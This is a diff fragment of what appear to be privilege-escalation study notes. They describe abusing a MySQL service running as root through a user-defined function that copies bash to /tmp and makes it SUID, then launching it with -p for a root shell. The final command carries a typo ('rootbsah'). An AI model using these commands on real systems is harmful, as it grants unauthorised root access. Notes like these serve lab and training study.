@@ -11,7 +11,13 @@ check the services that can run as root, in the current machine we can connect t
 Find the version of mysql by running `mysqld --version` then find an exploit that matches the version 
 
  in the current machine we create an SUID version of the bash shell 
+ run the following query in sql then exit out and run the file with -p
+```
+select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
+exit
 
+/tmp/rootbsah -p
+```
 
 
 
